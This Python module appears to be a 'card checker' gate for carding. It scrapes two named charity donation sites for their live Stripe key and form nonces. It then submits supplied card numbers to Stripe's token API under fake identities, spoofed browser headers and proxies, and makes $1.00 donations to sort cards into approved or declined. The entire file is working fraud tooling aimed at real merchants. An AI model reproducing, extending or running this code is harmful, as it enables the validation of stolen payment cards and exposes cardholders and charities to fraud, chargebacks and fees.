"""
Stripe Payment Gateway Checker - Full Transaction Flow
Parses merchant donation page's embedded Charitable configuration for exact AJAX payload.
"""

import requests
import re
import random
import json
from urllib.parse import quote_plus
from faker import Faker
from bs4 import BeautifulSoup
from gates.utilities import http_request, REQUEST_TIMEOUT

MERCHANT_SITES = [
    {
        'name': 'saintvinson',
        'donate_url': 'https://www.saintvinsoneugeneallen.com/donate/',
        'ajax_url': 'https://www.saintvinsoneugeneallen.com/wp-admin/admin-ajax.php',
    },
    {
        'name': 'ccfoundation',
        'donate_url': 'https://ccfoundationorg.com/donate/',
        'ajax_url': 'https://ccfoundationorg.com/wp-admin/admin-ajax.php',
    },
]


def _parse_charitable_config(html):
    """
    Parse the embedded Charitable configuration from the page's JavaScript.
    Looks for charitable_donation_vars or similar config objects.
    """
    config = {}
    
    # Pattern 1: Look for charitable_donation_vars in script blocks
    patterns = [
        r'var\s+charitable_donation_vars\s*=\s*({[^;]+});',
        r'charitable_donation_vars\s*=\s*({[^;]+});',
        r'"charitable"\s*:\s*({[^}]+})',
        r'window\.charitable\s*=\s*({[^;]+});',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html, re.DOTALL)
        if match:
            try:
                config_str = match.group(1)
                # Clean up common JS to JSON issues
                config_str = re.sub(r',\s*}', '}', config_str)
                config_str = re.sub(r',\s*]', ']', config_str)
                parsed = json.loads(config_str)
                config.update(parsed)
            except (json.JSONDecodeError, ValueError):
                continue
    
    return config


def _scrape_page_tokens(session, donate_url):
    """
    Scrape all required tokens from donation page:
    - Stripe PK from page or config
    - Nonces from hidden inputs and JS config
    - Form IDs, campaign IDs, dynamic field hashes
    """
    try:
        r = session.get(donate_url, timeout=15)
        if r.status_code != 200:
            return None
        
        html = r.text
        tokens = {}
        
        # Extract Stripe PK
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        if pk_match:
            tokens['stripe_pk'] = pk_match.group(0)
        
        # Parse embedded Charitable config from JavaScript
        charitable_config = _parse_charitable_config(html)
        if charitable_config:
            if 'nonce' in charitable_config:
                tokens['_charitable_donation_nonce'] = charitable_config['nonce']
            if 'form_id' in charitable_config:
                tokens['charitable_form_id'] = charitable_config['form_id']
            if 'campaign_id' in charitable_config:
                tokens['campaign_id'] = charitable_config['campaign_id']
        
        # Parse with BeautifulSoup for hidden inputs
        soup = BeautifulSoup(html, 'html.parser')
        
        # Find all hidden inputs and capture their values
        for hidden in soup.find_all('input', {'type': 'hidden'}):
            name = hidden.get('name', '')
            value = hidden.get('value', '')
            
            if name == '_charitable_donation_nonce':
                tokens['_charitable_donation_nonce'] = value
            elif name == 'charitable_form_id':
                tokens['charitable_form_id'] = value
            elif name == 'campaign_id':
                tokens['campaign_id'] = value
            elif name == '_wp_http_referer':
                tokens['_wp_http_referer'] = value
            elif re.match(r'^[a-f0-9]+$', name) and not value:
                # Dynamic hashed field (empty value with hex name)
                tokens['dynamic_hash_field'] = name
        
        # Regex fallbacks for nonce patterns
        nonce_patterns = [
            (r'name="_charitable_donation_nonce"\s+value="([a-f0-9]+)"', '_charitable_donation_nonce'),
            (r'id="_charitable_donation_nonce"\s+value="([a-f0-9]+)"', '_charitable_donation_nonce'),
            (r'"_charitable_donation_nonce"\s*:\s*"([a-f0-9]+)"', '_charitable_donation_nonce'),
            (r'name="charitable_form_id"\s+value="([a-f0-9]+)"', 'charitable_form_id'),
            (r'data-nonce="([a-f0-9]+)"', '_charitable_donation_nonce'),
        ]
        
        for pattern, key in nonce_patterns:
            if key not in tokens:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    tokens[key] = match.group(1)
        
        # Extract campaign ID from various sources
        if 'campaign_id' not in tokens:
            campaign_patterns = [
                r'campaign_id["\']?\s*[=:]\s*["\']?(\d+)["\']?',
                r'data-campaign-id="(\d+)"',
                r'"campaign_id"\s*:\s*"?(\d+)"?',
            ]
            for pattern in campaign_patterns:
                match = re.search(pattern, html)
                if match:
                    tokens['campaign_id'] = match.group(1)
                    break
        
        # Validate minimum required tokens
        if tokens.get('stripe_pk'):
            return tokens
        
        return None
    except Exception:
        return None


def stripe_check(card_num, card_mon, card_yer, card_cvc, proxy=None, timeout=30):
    """
    Stripe Payment check using merchant donation form.
    
    Full flow:
    1. Fetch donation page and parse Charitable configuration
    2. Create Payment Method via Stripe API with merchant's PK
    3. Submit Payment Method to donation AJAX endpoint with exact payload
    
    Returns (result_string, proxy_status_bool)
    """
    fake = Faker()
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    session.verify = False

    if proxy:
        session.proxies.update(proxy)

    # Step 1: Find working merchant and scrape tokens
    tokens = None
    active_site = None
    
    for site in MERCHANT_SITES:
        tokens = _scrape_page_tokens(session, site['donate_url'])
        if tokens and tokens.get('stripe_pk'):
            active_site = site
            break
    
    if not tokens or not active_site:
        return ("DECLINED ❌ Could not access merchant site", False)
    
    stripe_pk = tokens['stripe_pk']
    
    # Step 2: Create token via Stripe Tokens API (older integration surface)
    headers_pm = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/'
    }

    name = fake.name()
    email = fake.email()
    postal = fake.postcode()
    address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()

    # Use Tokens API which works with older Stripe integrations
    data_token = (f'card[number]={card_num}'
                  f'&card[cvc]={card_cvc}'
                  f'&card[exp_month]={card_mon}'
                  f'&card[exp_year]={card_yer}'
                  f'&card[name]={quote_plus(name)}'
                  f'&card[address_line1]={quote_plus(address)}'
                  f'&card[address_city]={quote_plus(city)}'
                  f'&card[address_state]={state}'
                  f'&card[address_zip]={postal}'
                  f'&card[address_country]=US'
                  f'&guid={random.randint(100000, 999999)}'
                  f'&muid={random.randint(100000, 999999)}'
                  f'&sid={random.randint(100000, 999999)}'
                  f'&payment_user_agent=stripe.js/v3'
                  f'&time_on_page={random.randint(50000, 90000)}'
                  f'&referrer={quote_plus(active_site["donate_url"])}'
                  f'&key={stripe_pk}')

    try:
        rpm = session.post('https://api.stripe.com/v1/tokens', 
                          headers=headers_pm, data=data_token, timeout=timeout)
        
        if rpm.status_code == 402:
            try:
                msg = rpm.json().get('error', {}).get('message', 'card declined')
                return (f"DECLINED ❌ {msg}", True)
            except (ValueError, KeyError):
                return ("DECLINED ❌ Card declined (402)", True)
        
        try:
            pm_json = rpm.json()
            if 'error' in pm_json:
                err = pm_json['error']
                msg = err.get('message', 'Unknown Stripe error')
                decline_code = err.get('decline_code', err.get('code', ''))
                msg_lower = msg.lower()

                if decline_code == 'insufficient_funds' or 'insufficient_funds' in msg_lower:
                    return ("DECLINED ❌ Insufficient Funds", True)
                if decline_code in ['incorrect_cvc', 'invalid_cvc'] or 'security code is incorrect' in msg_lower:
                    return ("DECLINED ❌ CVV Mismatch", True)
                if decline_code == 'expired_card' or 'expired' in msg_lower:
                    return ("DECLINED ❌ Expired Card", True)
                if decline_code == 'incorrect_number' or ('invalid' in msg_lower and 'number' in msg_lower):
                    return ("DECLINED ❌ Invalid Card Number", True)
                if decline_code == 'incorrect_zip':
                    return ("DECLINED ❌ AVS Failed (Postal Code)", True)
                if decline_code == 'card_declined' or 'card was declined' in msg_lower:
                    return ("DECLINED ❌ Card Declined", True)
                if decline_code == 'generic_decline':
                    return ("DECLINED ❌ Generic Decline", True)
                if decline_code == 'do_not_honor':
                    return ("DECLINED ❌ Do Not Honor", True)
                if decline_code == 'fraudulent':
                    return ("DECLINED ❌ Fraud Detected", True)
                if decline_code == 'lost_card':
                    return ("DECLINED ❌ Lost Card", True)
                if decline_code == 'stolen_card':
                    return ("DECLINED ❌ Stolen Card", True)

                return (f"DECLINED ❌ {msg[:60]}", True)

            token_id = pm_json.get('id')
            if not token_id or not token_id.startswith('tok_'):
                return ("DECLINED ❌ Invalid Token", True)

        except ValueError:
            return (f"DECLINED ❌ Invalid response ({rpm.status_code})", True)

        # Step 3: Submit Token to donation form with exact payload
        first_name = name.split()[0] if ' ' in name else name
        last_name = name.split()[-1] if ' ' in name else 'Donor'

        origin = '/'.join(active_site['ajax_url'].split('/')[:3])
        
        headers_donation = {
            'authority': active_site['ajax_url'].split('/')[2],
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': origin,
            'referer': active_site['donate_url'],
            'x-requested-with': 'XMLHttpRequest',
        }

        # Build donation data with scraped tokens
        form_id = tokens.get('charitable_form_id', f'{random.randint(100000, 999999):x}')
        
        donation_data = {
            'charitable_form_id': form_id,
            '_charitable_donation_nonce': tokens.get('_charitable_donation_nonce', ''),
            '_wp_http_referer': tokens.get('_wp_http_referer', '/donate/'),
            'campaign_id': tokens.get('campaign_id', '988003'),
            'description': 'Donation',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'recurring_donation': '',
            'title': 'Mr',
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'address': address,
            'postcode': postal,
            'gateway': 'stripe',
            'stripe_token': token_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        # Add dynamic hash field if found
        if tokens.get('dynamic_hash_field'):
            donation_data[tokens['dynamic_hash_field']] = ''
        
        # Also add form_id as its own field (some forms require this)
        donation_data[form_id] = ''

        rdonation = session.post(
            active_site['ajax_url'],
            headers=headers_donation,
            data=donation_data,
            timeout=timeout
        )

        response_text = rdonation.text.lower()

        if 'requires_action' in response_text or 'requires_payment_method' in response_text:
            return ("APPROVED ✅ 3DS Required", True)
        
        if any(kw in response_text for kw in ['succeeded', 'success', 'thank you', 'approved', 'complete']):
            return ("APPROVED ✅ Charged $1.00", True)

        if 'insufficient_funds' in response_text or 'insufficient funds' in response_text:
            return ("DECLINED ❌ Insufficient Funds", True)
        if 'do_not_honor' in response_text:
            return ("DECLINED ❌ Do Not Honor", True)
        if 'card_declined' in response_text or 'declined' in response_text:
            return ("DECLINED ❌ Card Declined", True)
        if 'expired' in response_text:
            return ("DECLINED ❌ Expired Card", True)
        if 'cvc' in response_text or 'cvv' in response_text:
            return ("DECLINED ❌ CVV Mismatch", True)
        if 'error' in response_text or 'failed' in response_text:
            return ("DECLINED ❌ Transaction Failed", True)

        return ("APPROVED ✅ Authorized (Unconfirmed)", True)

    except requests.exceptions.ProxyError:
        return ("DECLINED ❌ Proxy connection failed", False)
    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timed out", False)
    except Exception as e:
        return (f"DECLINED ❌ {str(e)[:60]}", False)


def health_check() -> bool:
    """Quick health check for Stripe API connectivity"""
    try:
        response = requests.get("https://api.stripe.com/v1/account", timeout=5)
        return response.status_code in [401, 403, 400]
    except Exception:
        return False
